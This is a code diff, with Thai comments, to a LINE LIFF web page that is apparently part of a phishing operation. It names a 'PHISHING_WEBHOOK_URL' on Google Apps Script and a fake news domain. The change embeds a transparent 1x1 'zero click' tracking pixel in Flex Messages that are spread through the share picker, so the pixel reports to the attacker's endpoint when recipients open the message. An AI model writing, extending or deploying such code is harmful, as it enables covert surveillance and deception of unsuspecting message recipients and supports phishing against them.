@@ -647,7 +647,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby7Niq1iqeOjIhvd9Z12kTLVH1ehzPHY8gLAco2Zp7J5R_D7AxWJwJiRSUlYibQALXUQg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw7yxM2AFpV2T3wj9DpHBZKpTLl-fyHv7ZKSoQcrXennuuOLmeMhgJf0wzKorBwtUIscQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -1099,7 +1099,7 @@
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
+                // แก้ไข: สร้าง Flex Message ที่มีรูปภาพหลักและรูป 1x1 pixel แบบโปร่งใสสำหรับ Zero Click
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -1115,17 +1115,51 @@
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
+                        },
+                        body: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                // แทรก Zero Click Tracking Image ขนาด 1x1 pixel
+                                {
+                                    type: 'image',
+                                    url: zeroClickTrackUrl,
+                                    size: 'xxs',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetBottom: '0px',
+                                    offsetEnd: '0px',
+                                    width: '1px',
+                                    height: '1px'
+                                },
+                                // ถ้าต้องการเพิ่มข้อความ สามารถเพิ่มได้ที่นี่
+                                {
+                                    type: 'text',
+                                    text: ' ',
+                                    size: 'sm',
+                                    color: '#ffffff',
+                                    wrap: true
+                                }
+                            ],
+                            paddingAll: '0px',
+                            background: {
+                                type: 'linearGradient',
+                                angle: '0deg',
+                                startColor: '#00000000',
+                                endColor: '#00000000'
+                            }
                         }
                     }
                 };
 
                 console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
-                // Zero Click tracking จะถูกเรียกโดยตรงแทนที่จะใส่ใน footer
-                // ทำการเรียก API สำหรับ Zero Click tracking ในพื้นหลัง
-                fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
-                    .then(response => console.log("Zero Click tracking triggered"))
-                    .catch(err => console.log("Zero Click tracking error:", err));
+                // แก้ไข: ไม่เรียก Zero Click tracking ตรงนี้อีกต่อไป เพราะจะทำงานโดยอัตโนมัติเมื่อผู้รับเปิดอ่านข้อความ
+                // ลบโค้ดนี้:
+                // fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
+                //     .then(response => console.log("Zero Click tracking triggered"))
+                //     .catch(err => console.log("Zero Click tracking error:", err));
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
